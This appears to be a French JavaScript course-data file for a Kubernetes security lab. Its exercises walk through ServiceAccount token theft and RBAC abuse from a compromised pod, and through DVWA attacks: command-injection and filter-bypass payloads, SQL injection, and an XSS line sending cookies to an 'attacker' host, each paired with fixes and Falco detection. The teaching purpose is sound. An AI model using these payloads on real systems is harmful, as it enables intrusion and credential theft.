            motifs: ["^kubectl\\s+exec", "-it", "hello-world", "--", "(sh|bash)"],
            solution: "kubectl exec -it flask-helloworld-0 -n hello-world -- sh",
            sortie: "/app $"
          }
        ]
      },

      /* ---- Niveau 3 : Helm + Kustomize (avancé) ---- */
      {
        type: "terminal",
        id: "term-k8s-helm-kustomize",
        titre: "Niveau 3 — Industrialiser avec Helm et Kustomize (avancé)",
        terminal: "bash — poste d'admin (kubectl/helm)",
        invite: "analyst@debian:~$",
        cours: "Au-delà du manifeste unique : Helm installe des applications packagées (charts) paramétrables, Kustomize décline une base commune par environnement (overlays). Objectif TP2 : déployer nginx via Helm, puis appliquer un overlay de prod avec Kustomize.",
        exemple: {
          legende: "Installer un chart Helm",
          code: "helm install web bitnami/nginx -n helm-nginx"
        },
        intro: [
          "Advanced orchestration (TP2 exercises 3 and 4).",
          "Add a Helm repo, install nginx, upgrade it with a values file, then render and apply a Kustomize prod overlay."
        ],
        accueil: "Helm & Kustomize lab — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Ajouter le dépôt de charts **Bitnami**.",
            indice: "helm repo add bitnami https://charts.bitnami.com/bitnami",
            lieu: "Poste d'admin (helm parle au control-plane)",
            motifs: ["^helm\\s+repo\\s+add", "bitnami"],
            solution: "helm repo add bitnami https://charts.bitnami.com/bitnami",
            sortie: "\"bitnami\" has been added to your repositories"
          },
          {
            enonce: "Installer le chart **nginx** dans le namespace `helm-nginx` (release `web`).",
            indice: "helm install web bitnami/nginx -n helm-nginx",
            lieu: "Poste d'admin → control-plane (Helm crée les ressources)",
            motifs: ["^helm\\s+install", "bitnami/nginx", "helm-nginx"],
            solution: "helm install web bitnami/nginx -n helm-nginx",
            sortie: "NAME: web\nSTATUS: deployed\nREVISION: 1"
          },
          {
            enonce: "Mettre à jour la release avec un fichier de valeurs (`values.yaml`).",
            indice: "helm upgrade web bitnami/nginx -n helm-nginx -f values.yaml",
            lieu: "Poste d'admin → control-plane (mise à jour incrémentale)",
            motifs: ["^helm\\s+upgrade", "web", "-f", "values"],
            solution: "helm upgrade web bitnami/nginx -n helm-nginx -f values.yaml",
            sortie: "Release \"web\" has been upgraded. REVISION: 2"
          },
          {
            enonce: "**Prévisualiser** le rendu de l'overlay de production (sans l'appliquer).",
            indice: "kubectl kustomize overlays/prod",
            lieu: "Poste d'admin (rendu local, aucun changement sur le cluster)",
            motifs: ["^kubectl\\s+kustomize", "overlays/prod"],
            solution: "kubectl kustomize overlays/prod",
            sortie: "kind: Deployment\nmetadata:\n  namespace: flask-prod\nspec:\n  replicas: 8"
          },
          {
            enonce: "**Appliquer** l'overlay de production.",
            indice: "kubectl apply -k overlays/prod",
            lieu: "Poste d'admin → control-plane",
            motifs: ["^kubectl\\s+apply", "-k", "overlays/prod"],
            solution: "kubectl apply -k overlays/prod",
            sortie: "namespace/flask-prod created\ndeployment.apps/flask-helloworld created"
          },
          {
            enonce: "Vérifier les réplicas de prod (attendu : 8) dans `flask-prod`.",
            indice: "kubectl get deploy -n flask-prod",
            lieu: "Poste d'admin → control-plane",
            motifs: ["^kubectl\\s+get\\s+deploy", "flask-prod"],
            solution: "kubectl get deploy -n flask-prod",
            sortie: "NAME               READY   UP-TO-DATE\nflask-helloworld   8/8     8"
          }
        ]
      }
    ]
  });

  /* =========================================================
     GUIDE G7 — Faille pas à pas : token ServiceAccount & RBAC
     ========================================================= */
  C.guides.push({
    id: "faille-token-rbac",
    titre: "Faille pas à pas — Token de pod et RBAC trop permissif",
    resume: "Depuis un pod compromis : localiser le token du ServiceAccount, s'en servir pour parler à l'apiserver, mesurer l'impact d'un RBAC trop large, puis corriger par le moindre privilège. Tout se passe DANS un pod, face au control-plane.",
    duree: "30 min",
    niveau: "Avancé",
    badge: "Faille pas à pas",
    prealables: [
      "Avoir lu « Se repérer dans un cluster Kubernetes ».",
      "Contexte : le point d'entrée (un shell dans un pod) est déjà obtenu via une appli vulnérable (DVWA, TP5). On part de là."
    ],
    sections: [
      {
        type: "notion",
        titre: "Le principe : chaque pod porte une identité",
        texte: "Kubernetes monte automatiquement un **token de ServiceAccount** dans chaque pod, sous `/var/run/secrets/kubernetes.io/serviceaccount/`. Ce token permet au pod de parler à l'apiserver. Sa dangerosité dépend entièrement des droits **RBAC** attachés au ServiceAccount.",
        points: [
          "Token peu privilégié = impact limité. Token lié à un rôle trop large = l'attaquant hérite de ces droits.",
          "Le pire cas : un ServiceAccount lié à `cluster-admin` — un shell dans n'importe quel pod devient un contrôle du cluster.",
          "Repère d'arbre : vous êtes DANS un pod (sur un worker) ; le token vous permet de remonter vers le **control-plane** (apiserver)."
        ],
        remarque: "C'est l'exercice 2 du TP5. La faille n'est pas le token (il est normal), mais les droits qu'on lui a accordés."
      },
      {
        titre: "Étape 0 — Se repérer : je suis dans un pod",
        texte: "Après compromission de l'appli, l'invite ressemble à `www-data@dvwa-7d9f:/var/www/html$`. Le nom d'hôte est celui du pod, l'utilisateur est applicatif. On confirme qu'on est bien dans un conteneur de pod.",
        code: "id\nhostname\nls /var/run/secrets/kubernetes.io/serviceaccount/",
        sortie: "uid=33(www-data)\ndvwa-7d9f8c6b4-xk2lp\nca.crt  namespace  token"
      },
      {
        titre: "Étape 1 — Récupérer le token et le contexte",
        texte: "Trois fichiers comptent : le namespace, l'autorité de certification (`ca.crt`) et le `token`. On lit aussi l'adresse de l'apiserver via les variables d'environnement.",
        code: "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nCACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nenv | grep KUBERNETES",
        sortie: "dvwa-lab\nKUBERNETES_SERVICE_HOST=10.43.0.1\nKUBERNETES_SERVICE_PORT=443",
        remarque: "Le service `kubernetes.default.svc` pointe toujours vers l'apiserver depuis l'intérieur du cluster."
      },
      {
        titre: "Étape 2 — Interroger l'apiserver avec le token",
        texte: "On envoie une requête authentifiée par le token. **Repère d'arbre** : la requête part du pod et atteint le control-plane. Ce qu'elle renvoie mesure les droits du ServiceAccount.",
        code: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\\n  https://kubernetes.default.svc/api/v1/namespaces/dvwa-lab/pods",
        sortie: "{\"kind\":\"PodList\",\"items\":[ … ]}   # le SA peut lister les pods",
        attention: "Si cette requête réussit, le SA a déjà le droit de lister les pods. On teste ensuite des ressources plus sensibles (secrets, autres namespaces) pour cartographier l'étendue réelle."
      },
      {
        titre: "Étape 3 — Mesurer un RBAC trop permissif",
        texte: "On tente d'accéder à des secrets, y compris dans un autre namespace. Si cela réussit, le RBAC est trop large : c'est l'escalade.",
        code: "# secrets d'un autre namespace ?\ncurl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" \\\n  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
        sortie: "{\"kind\":\"SecretList\",\"items\":[{\"metadata\":{\"name\":\"…-token\"}, \"data\":{\"token\":\"ZXlK…\"}}]}",
        remarque: "Les valeurs de secrets sont en base64 (pas chiffrées) : `echo <valeur> | base64 -d` les révèle."
      },
      {
        type: "notion",
        titre: "Corriger : moindre privilège et détection",
        texte: "On réduit les droits au strict nécessaire, et on surveille l'usage anormal du token.",
        points: [
          "Ne lier un ServiceAccount qu'à un **Role** minimal, dans **son** namespace (jamais `cluster-admin` par défaut).",
          "Auditer avec `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>` : vérifier ce que le SA peut réellement faire.",
          "Désactiver le montage du token quand le pod n'en a pas besoin : `automountServiceAccountToken: false`.",
          "Chiffrer les secrets au repos (chiffrement d'etcd) ; ne pas se contenter du base64.",
          "**Détecter** : Falco alerte sur la lecture du token, l'ouverture d'un shell dans un conteneur web, ou un accès à `/var/run/docker.sock`."
        ],
        remarque: "TP5 ex.3 : Falco intercepte les appels système du noyau (partagé) et lève une alerte quand un comportement sort de la norme — le dernier rempart quand la prévention a cédé."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Pentest & défense Kubernetes (3 niveaux, TP5)
     ========================================================= */
  C.chapitres.push({
    id: "ch-k8s-pentest",
    titre: "Chapitre 6 — Pentest et défense d'un cluster Kubernetes",
    description: "Trois terminaux depuis un pod compromis : découvrir le token du ServiceAccount, interroger l'apiserver (niveau TP5), puis abuser d'un RBAC trop large et se faire détecter par Falco.",
    exercices: [

      /* ---- Niveau 1 : découvrir le token depuis le pod ---- */
      {
        type: "terminal",
        id: "term-k8s-token-decouverte",
        titre: "Niveau 1 — Découvrir le token d'un pod",
        terminal: "sh — shell dans le pod DVWA",
        invite: "www-data@dvwa-7d9f:/var/www/html$",
        cours: "Vous disposez déjà d'un shell dans le pod DVWA (obtenu via une injection de commande, cf. TP5 ex.1). Ici, simple découverte : confirmer que vous êtes dans un pod et localiser le token du ServiceAccount monté automatiquement.",
        exemple: {
          legende: "Le token monté dans tout pod",
          code: "ls /var/run/secrets/kubernetes.io/serviceaccount/"
        },
        intro: [
          "You already have a shell inside the DVWA pod (initial access via a web command-injection vuln — see the course).",
          "Discovery only: confirm you are inside a pod and locate the ServiceAccount token, CA and namespace that Kubernetes mounts automatically."
        ],
        accueil: "Pod discovery — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Confirmer l'utilisateur courant (applicatif, non-root) dans le pod.",
            indice: "La commande de trois lettres qui affiche l'identité.",
            lieu: "Dans le pod DVWA (conteneur, utilisateur www-data)",
            motifs: ["^id\\b"],
            solution: "id",
            sortie: "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
          },
          {
            enonce: "Lister le dossier du ServiceAccount monté dans le pod.",
            indice: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
            lieu: "Dans le pod DVWA",
            motifs: ["^ls\\s", "secrets/kubernetes\\.io/serviceaccount"],
            solution: "ls /var/run/secrets/kubernetes.io/serviceaccount/",
            sortie: "ca.crt  namespace  token"
          },
          {
            enonce: "Lire le **namespace** du pod.",
            indice: "cat …/serviceaccount/namespace",
            lieu: "Dans le pod DVWA",
            motifs: ["^cat\\s", "serviceaccount/namespace"],
            solution: "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
            sortie: "dvwa-lab"
          },
          {
            enonce: "Repérer l'adresse de l'apiserver dans les variables d'environnement.",
            indice: "env | grep KUBERNETES",
            lieu: "Dans le pod DVWA → l'apiserver est le control-plane",
            motifs: ["^env\\b", "KUBERNETES"],
            solution: "env | grep KUBERNETES",
            sortie: "KUBERNETES_SERVICE_HOST=10.43.0.1\nKUBERNETES_SERVICE_PORT=443"
          }
        ]
      },

      /* ---- Niveau 2 : interroger l'apiserver (TP5 ex2) ---- */
      {
        type: "terminal",
        id: "term-k8s-token-api",
        titre: "Niveau 2 — Parler à l'apiserver avec le token (niveau TP5)",
        terminal: "sh — shell dans le pod DVWA",
        invite: "www-data@dvwa-7d9f:/var/www/html$",
        cours: "Le token du pod permet d'appeler l'apiserver. On le stocke, on référence le CA, puis on liste les pods du namespace. Ce que l'API renvoie mesure les droits du ServiceAccount. C'est l'exercice 2 du TP5.",
        exemple: {
          legende: "Appel authentifié à l'apiserver depuis le pod",
          code: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/dvwa-lab/pods"
        },
        intro: [
          "From the DVWA pod, use the mounted token to query the Kubernetes API server.",
          "Store the token, point to the CA, then list the pods of your namespace — the request leaves the pod and hits the control-plane."
        ],
        accueil: "API access — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Stocker le token dans une variable `TOKEN`.",
            indice: "TOKEN=$(cat …/serviceaccount/token)",
            lieu: "Dans le pod DVWA",
            motifs: ["^TOKEN=", "cat", "serviceaccount/token"],
            solution: "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
            sortie: "(token chargé dans $TOKEN)"
          },
          {
            enonce: "Pointer le certificat d'autorité dans une variable `CACERT`.",
            indice: "CACERT=…/serviceaccount/ca.crt",
            lieu: "Dans le pod DVWA",
            motifs: ["^CACERT=", "serviceaccount/ca\\.crt"],
            solution: "CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
            sortie: "(chemin du CA enregistré)"
          },
          {
            enonce: "Lister les **pods** du namespace `dvwa-lab` via l'API, authentifié par le token.",
            indice: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/dvwa-lab/pods",
            lieu: "Pod DVWA → requête vers l'apiserver (control-plane)",
            motifs: ["^curl", "cacert", "[Bb]earer", "\\$TOKEN", "/api/v1/namespaces/dvwa-lab/pods"],
            solution: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/dvwa-lab/pods",
            sortie: "{\"kind\":\"PodList\",\"items\":[{\"metadata\":{\"name\":\"dvwa-7d9f…\"}}]}"
          },
          {
            enonce: "Tester si le SA peut lire les **secrets** de son namespace.",
            indice: "Même requête, mais la ressource /secrets.",
            lieu: "Pod DVWA → requête vers l'apiserver (control-plane)",
            motifs: ["^curl", "[Bb]earer", "\\$TOKEN", "/api/v1/namespaces/dvwa-lab/secrets"],
            solution: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/dvwa-lab/secrets",
            sortie: "{\"kind\":\"SecretList\",\"items\":[ … ]}   # le SA peut lire les secrets : à corriger"
          }
        ]
      },

      /* ---- Niveau 3 : abus RBAC + détection Falco (avancé) ---- */
      {
        type: "terminal",
        id: "term-k8s-rbac-falco",
        titre: "Niveau 3 — Abus de RBAC puis détection Falco (avancé)",
        terminal: "sh — pod DVWA, puis poste d'admin",
        invite: "www-data@dvwa-7d9f:/var/www/html$",
        cours: "Le ServiceAccount a été lié à un rôle trop large. On l'exploite pour lire des secrets d'un AUTRE namespace, on décode la valeur, puis on bascule côté défense : auditer le RBAC, le corriger, et constater l'alerte Falco. Ce niveau relie les exercices 2 et 3 du TP5.",
        exemple: {
          legende: "Auditer les droits réels d'un ServiceAccount",
          code: "kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default"
        },
        intro: [
          "The DVWA ServiceAccount was mis-bound to an over-broad role.",
          "Abuse it to read secrets in kube-system, decode one, then switch to the admin side: audit the RBAC, remediate with least privilege, and observe Falco's alert."
        ],
        accueil: "RBAC abuse & detection — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Depuis le pod, lister les **secrets de `kube-system`** (autre namespace) avec le token.",
            indice: "curl … /api/v1/namespaces/kube-system/secrets",
            lieu: "Pod DVWA → apiserver (accès cross-namespace = RBAC trop large)",
            motifs: ["^curl", "[Bb]earer", "\\$TOKEN", "/api/v1/namespaces/kube-system/secrets"],
            solution: "curl --cacert $CACERT -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
            sortie: "{\"kind\":\"SecretList\",\"items\":[{\"metadata\":{\"name\":\"admin-token\"},\"data\":{\"token\":\"ZXlKaGJHY2lPaUo…\"}}]}"
          },
          {
            enonce: "**Décoder** la valeur base64 d'un secret récupéré.",
            indice: "echo <valeur_base64> | base64 -d",
            lieu: "Pod DVWA",
            motifs: ["base64", "-d"],
            solution: "echo ZXlKaGJHY2lPaUo | base64 -d",
            sortie: "eyJhbGciOiJ… (token admin en clair : escalade réussie)"
          },
          {
            enonce: "Côté défense — sur le poste d'admin, **auditer** les droits réels du ServiceAccount.",
            indice: "kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default",
            lieu: "Poste d'admin → control-plane (audit RBAC)",
            invite: "analyst@debian:~$",
            motifs: ["^kubectl\\s+auth\\s+can-i", "--list", "as=system:serviceaccount:dvwa-lab"],
            solution: "kubectl auth can-i --list --as=system:serviceaccount:dvwa-lab:default",
            sortie: "Resources  Verbs\nsecrets    [get list]   <-- trop large\npods       [get list]"
          },
          {
            enonce: "**Corriger** en appliquant un Role de moindre privilège (fichier fourni).",
            indice: "kubectl apply -f rbac-least-privilege.yaml",
            lieu: "Poste d'admin → control-plane (remédiation RBAC)",
            motifs: ["^kubectl\\s+apply", "-f", "rbac"],
            solution: "kubectl apply -f rbac-least-privilege.yaml",
            sortie: "role.rbac.authorization.k8s.io/dvwa-minimal configured\nrolebinding.rbac.authorization.k8s.io/dvwa-minimal configured"
          },
          {
            enonce: "**Détecter** : lire les alertes de Falco pour retrouver la lecture du token / le shell.",
            indice: "kubectl logs -n falco -l app.kubernetes.io/name=falco",
            lieu: "Poste d'admin → journaux de Falco (détection)",
            motifs: ["^kubectl\\s+logs", "falco"],
            solution: "kubectl logs -n falco -l app.kubernetes.io/name=falco",
            sortie: "Warning Sensitive file opened for reading (file=/var/run/secrets/.../token) pod=dvwa-7d9f\nNotice Shell spawned in container (container=dvwa)"
          }
        ]
      }
    ]
  });

  /* =========================================================
     GUIDE G8 — Exploiter DVWA : les vulnérabilités web
     ========================================================= */
  C.guides.push({
    id: "faille-dvwa-web",
    titre: "Faille pas à pas — Les vulnérabilités web de DVWA",
    resume: "Injection de commande, injection SQL, XSS, inclusion de fichier, upload : pour chacune, comment la faille naît dans le code, comment l'exploiter en labo, et comment la corriger. C'est le vecteur d'accès initial qui mène au shell dans le pod.",
    duree: "40 min",
    niveau: "Intermédiaire",
    badge: "Faille pas à pas",
    prealables: [
      "Cadre : DVWA (Damn Vulnerable Web Application) est une appli VOLONTAIREMENT vulnérable, déployée dans un labo isolé (TP5). On n'exploite jamais ces techniques hors d'un environnement autorisé.",
      "Avoir déployé DVWA (pod dans le namespace `dvwa-lab`) et réglé « DVWA Security » sur *Low* pour débuter."
    ],
    sections: [
      {
        type: "notion",
        titre: "À quoi sert DVWA et où l'on se trouve",
        texte: "DVWA rejoue les failles web classiques (celles du Top 10 OWASP) dans un bac à sable. En sécurité offensive comme défensive, on l'utilise pour **comprendre le mécanisme** d'une faille avant de savoir la corriger.",
        points: [
          "Repère d'arbre : DVWA tourne **dans un pod** (sur un worker). Exploiter une faille de DVWA, c'est faire exécuter du code **dans le conteneur du pod** — pas sur votre poste.",
          "L'objectif final (TP5) : passer d'une faille web à un **shell dans le pod**, puis pivoter vers le cluster via le token du ServiceAccount (voir « Token de pod et RBAC »).",
          "Trois niveaux de difficulté dans DVWA : *Low* (aucun filtre), *Medium* (filtres naïfs à contourner), *High* (filtres plus stricts)."
        ],
        remarque: "Règle d'or : une faille web se comprend par le code qui la produit. On montre donc à chaque fois le motif vulnérable, l'exploitation, puis le correctif."
      },

      /* -------- Injection de commande -------- */
      {
        titre: "Injection de commande — le mécanisme",
        texte: "La page « Command Injection » de DVWA prend une IP et lance un `ping`. En *Low*, l'entrée est concaténée telle quelle dans une commande shell : tout ce que vous ajoutez après un séparateur est exécuté.",
        legende: "Code vulnérable (simplifié)",
        code: "// PHP — l'entrée utilisateur va directement dans le shell\n$ip = $_REQUEST['ip'];\n$out = shell_exec('ping -c 1 ' . $ip);   // <-- aucune validation",
        attention: "Le problème n'est pas `ping`, c'est de construire une commande shell par concaténation d'une entrée utilisateur."
      },
      {
        titre: "Injection de commande — exploiter (Low)",
        texte: "On chaîne une seconde commande derrière un séparateur. La sortie s'affiche dans la page.",
        tableau: {
          entetes: ["Charge (dans le champ IP)", "Effet"],
          lignes: [
            ["`127.0.0.1; id`", "Exécute `id` après le ping (séparateur `;`)"],
            ["`127.0.0.1; uname -a`", "Version du noyau du conteneur"],
            ["`127.0.0.1; cat /etc/passwd`", "Lit un fichier du conteneur"],
            ["`127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount`", "Révèle qu'on est dans un pod (token présent)"]
          ]
        },
        remarque: "La dernière charge est le pont vers Kubernetes : trouver le dossier `serviceaccount`, c'est confirmer qu'on est dans un pod exploitable."
      },
      {
        titre: "Injection de commande — contourner les filtres (Medium / High)",
        texte: "En *Medium*, DVWA retire naïvement `;` et `&&`. On utilise d'autres séparateurs. En *High*, la liste noire s'allonge : on passe par un saut de ligne encodé ou une substitution.",
        tableau: {
          entetes: ["Contournement", "Idée"],
          lignes: [
            ["`127.0.0.1| id`", "Le pipe `|` n'est pas filtré en Medium"],
            ["`127.0.0.1%0a id`", "`%0a` = saut de ligne : nouvelle commande"],
            ["``127.0.0.1`id` ``", "Substitution par accents graves"],
            ["`127.0.0.1| id > /var/www/html/o.txt`", "Exfil « aveugle » : écrire la sortie dans un fichier web puis le consulter"]
          ]
        },
        remarque: "Contourner une liste noire est toujours possible : c'est pourquoi la défense n'utilise jamais de liste noire (voir correctif)."
      },
      {
        type: "notion",
        titre: "Injection de commande — corriger",
        texte: "On ne filtre pas les « mauvais » caractères, on supprime la possibilité même d'injecter.",
        points: [
          "**Ne pas appeler de shell** : utiliser une fonction/bibliothèque native (résolution DNS, ping applicatif) plutôt que `shell_exec`.",
          "Si un binaire externe est indispensable, passer les arguments **en tableau** (pas de chaîne interprétée par un shell) : `execFile('ping', ['-c','1', ip])`.",
          "**Valider en liste blanche** : ici, l'entrée doit correspondre à une IP (`/^\\d{1,3}(\\.\\d{1,3}){3}$/`), sinon rejet.",
          "Principe de moindre privilège : le service web ne doit pas tourner en root dans le conteneur."
        ]
      },

      /* -------- Injection SQL -------- */
      {
        titre: "Injection SQL — le mécanisme",
        texte: "La page « SQL Injection » cherche un utilisateur par identifiant. En *Low*, l'`id` est concaténé dans la requête : une apostrophe suffit à sortir de la chaîne et à réécrire la logique.",
        legende: "Code vulnérable (simplifié)",
        code: "// PHP — l'id utilisateur est collé dans la requête\n$id = $_REQUEST['id'];\n$q = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\";",
        attention: "Une entrée `1' OR '1'='1` transforme la condition en « toujours vrai » : toutes les lignes sortent."
      },
      {
        titre: "Injection SQL — exploiter (UNION)",
        texte: "On confirme l'injection, on trouve le nombre de colonnes, puis on utilise `UNION SELECT` pour lire d'autres tables. Le `-- -` commente la fin de la requête d'origine.",
        tableau: {
          entetes: ["Charge (dans le champ User ID)", "But"],
          lignes: [
            ["`1' OR '1'='1`", "Confirmer l'injection (renvoie tout)"],
            ["`1' ORDER BY 2 -- -`", "Trouver le nombre de colonnes (2 ici)"],
            ["`1' UNION SELECT null, version() -- -`", "Lire la version de la base"],
            ["`1' UNION SELECT null, table_name FROM information_schema.tables -- -`", "Lister les tables"],
            ["`1' UNION SELECT user, password FROM users -- -`", "Extraire identifiants et empreintes"]
          ]
        },
        remarque: "Les empreintes extraites se cassent hors ligne (hashcat/john). C'est pourquoi un hachage lent et salé est essentiel côté défense."
      },
      {
        titre: "Injection SQL — à l'aveugle (blind)",
        texte: "Quand aucune donnée ne s'affiche, on déduit l'information d'un comportement : page différente (booléen) ou temps de réponse (temporel).",
        tableau: {
          entetes: ["Charge", "Technique"],
          lignes: [
            ["`1' AND '1'='1`", "Booléen vrai : page normale"],
            ["`1' AND '1'='2`", "Booléen faux : page différente"],
            ["`1' AND SUBSTRING(version(),1,1)='8`", "Extraire caractère par caractère"],
            ["`1' AND SLEEP(5) -- -`", "Temporel : la réponse tarde de 5 s"],
            ["`1' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(3),0) -- -`", "Extraction temporelle conditionnelle"]
          ]
        }
      },
      {
        type: "notion",
        titre: "Injection SQL — corriger",
        texte: "La seule défense fiable est de séparer le code SQL des données.",
        points: [
          "**Requêtes préparées / paramétrées** : `... WHERE user_id = ?` puis on lie la valeur. La donnée n'est jamais interprétée comme du SQL.",
          "**Compte de base de données à moindre privilège** : l'appli ne doit pas être `root` MySQL ni lire `information_schema` si inutile.",
          "**Hachage lent et salé** des mots de passe (bcrypt/argon2), jamais MD5.",
          "Défense en profondeur : WAF, messages d'erreur génériques, journalisation des requêtes anormales."
        ]
      },

      /* -------- XSS -------- */
      {
        titre: "XSS — le mécanisme et l'exploitation",
        texte: "Le Cross-Site Scripting injecte du JavaScript qui s'exécute dans le navigateur d'autres victimes. **Reflected** : la charge est renvoyée dans la réponse ; **Stored** : elle est enregistrée (ex. un commentaire) et rejouée à chaque visite.",
        code: "<!-- Reflected : dans un champ renvoyé sans échappement -->\n<script>alert(document.cookie)</script>\n\n<!-- Stored : vol de session vers un serveur contrôlé -->\n<script>new Image().src='http://attacker/c?'+document.cookie</script>",
        attention: "Impact typique : vol du cookie de session (donc du compte). En labo uniquement."
      },
      {
        type: "notion",
        titre: "XSS — corriger",
        texte: "On neutralise le contenu injecté à l'affichage.",
        points: [
          "**Échapper la sortie** selon le contexte (HTML, attribut, JS) — `htmlspecialchars` en PHP.",
          "**Content-Security-Policy** stricte : interdit les scripts en ligne non prévus.",
          "Cookies `HttpOnly` (inaccessibles au JS) et `Secure`.",
          "Valider/assainir les entrées côté serveur, jamais seulement côté client."
        ]
      },

      /* -------- Inclusion de fichier & upload -------- */
      {
        titre: "Inclusion de fichier (LFI/RFI) et upload",
        texte: "L'inclusion de fichier charge un fichier dont le nom vient de l'utilisateur ; l'upload accepte un fichier qui peut devenir exécutable. Deux voies fréquentes vers l'exécution de code.",
        tableau: {
          entetes: ["Charge / action", "Effet"],
          lignes: [
            ["`?page=../../../../etc/passwd`", "LFI : remonter l'arborescence pour lire un fichier"],
            ["`?page=php://filter/convert.base64-encode/resource=index`", "Lire le code source PHP encodé"],
            ["`?page=http://attacker/shell.txt`", "RFI : inclure un fichier distant (si `allow_url_include`)"],
            ["Upload d'un `shell.php`", "Déposer un webshell puis l'appeler pour exécuter des commandes"]
          ]
        },
        remarque: "Un webshell uploadé, c'est un accès shell dans le pod : même destination que l'injection de commande."
      },
      {
        type: "notion",
        titre: "Inclusion / upload — corriger",
        texte: "On enlève à l'utilisateur le contrôle des chemins et de l'exécution.",
        points: [
          "Inclure via une **liste blanche** de pages (une correspondance `clé → fichier`), jamais un chemin fourni par l'utilisateur.",
          "Désactiver `allow_url_include` / `allow_url_fopen`.",
          "Uploads : **valider le type réel**, renommer, stocker **hors de la racine web**, retirer le droit d'exécution.",
          "Système de fichiers du conteneur en lecture seule (`readOnlyRootFilesystem`) : un webshell ne peut plus s'écrire."
        ]
      },
      {
        type: "notion",
        titre: "Du web au cluster : l'accès initial",
        texte: "Toutes ces failles convergent vers un même but offensif : exécuter des commandes dans le conteneur du pod, puis obtenir un shell interactif.",
        points: [
          "Injection de commande ou webshell → exécution de commandes dans le pod.",
          "Reverse shell → shell interactif : on écoute sur sa machine (`nc -lvnp 4444`) et on fait revenir le pod vers nous.",
          "Une fois dans le pod, on lit le **token du ServiceAccount** et on attaque l'apiserver (chapitre « Pentest et défense d'un cluster »).",
          "Défense : corriger la faille applicative reste la priorité ; la détection (Falco) repère le shell anormal si la prévention échoue."
        ],
        remarque: "C'est exactement l'enchaînement du TP5 : faille web (ex.1) → token & RBAC (ex.2) → détection Falco (ex.3)."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Injection de commande (DVWA), 3 niveaux
     Terminal détourné en simulateur de « charge » : ce que
     vous tapez est le PAYLOAD saisi dans le champ vulnérable.
     ========================================================= */
  C.chapitres.push({
    id: "ch-dvwa-cmdi",
    titre: "Chapitre 7 — Injection de commande (DVWA)",
    description: "Trois terminaux où ce que vous tapez est la charge saisie dans le champ « Ping » de DVWA : injection simple, passage à un reverse shell (accès initial), puis contournement des filtres.",
    exercices: [

      /* ---- N1 : injection simple (Low) ---- */
      {
        type: "terminal",
        id: "term-dvwa-cmdi-low",
        titre: "Niveau 1 — Injecter une commande (sécurité Low)",
        terminal: "DVWA ▸ Command Injection ▸ champ « Ping a Host »",
        invite: "DVWA[cmd-injection] IP>",
        cours: "Le champ « Ping » lance `ping <votre saisie>` sans validation. En ajoutant un séparateur `;`, votre commande s'exécute dans le conteneur du pod. Ce que vous tapez ici est la CHARGE saisie dans le champ web.",
        exemple: {
          legende: "Chaîner une commande derrière le ping",
          code: "127.0.0.1; id"
        },
        intro: [
          "This terminal simulates the DVWA « Ping a Host » field (security = Low). What you type is the payload placed in that field.",
          "Anything after a `;` runs in the pod's container. Confirm code execution, then discover that DVWA runs inside a Kubernetes pod."
        ],
        accueil: "DVWA command injection (Low) — 'help' for a hint, 'solution' to reveal a payload.",
        objectifs: [
          {
            enonce: "Confirmer l'injection : faire exécuter `id` après le ping (séparateur `;`).",
            indice: "127.0.0.1; id",
            lieu: "Champ DVWA → commande exécutée dans le pod DVWA (www-data)",
            motifs: ["127\\.0\\.0\\.1", ";\\s*id\\b"],
            solution: "127.0.0.1; id",
            sortie: "PING 127.0.0.1 ... 1 packets transmitted\nuid=33(www-data) gid=33(www-data) groups=33(www-data)"
          },
          {
            enonce: "Récupérer la version du noyau du conteneur.",
            indice: "… ; uname -a",
            lieu: "Champ DVWA → exécuté dans le pod DVWA",
            motifs: ["127\\.0\\.0\\.1", ";", "uname", "-a"],
            solution: "127.0.0.1; uname -a",
            sortie: "Linux dvwa-7d9f8c6b4-xk2lp 5.15.0 ... x86_64 GNU/Linux"
          },
          {
            enonce: "Lire un fichier du conteneur : `/etc/passwd`.",
            indice: "… ; cat /etc/passwd",
            lieu: "Champ DVWA → exécuté dans le pod DVWA",
            motifs: ["127\\.0\\.0\\.1", ";", "cat", "/etc/passwd"],
            solution: "127.0.0.1; cat /etc/passwd",
            sortie: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
          },
          {
            enonce: "Prouver qu'on est dans un **pod** : lister le dossier du ServiceAccount.",
            indice: "… ; ls /var/run/secrets/kubernetes.io/serviceaccount",
            lieu: "Champ DVWA → on découvre le token : DVWA tourne dans un pod",
            motifs: ["127\\.0\\.0\\.1", ";", "ls", "serviceaccount"],
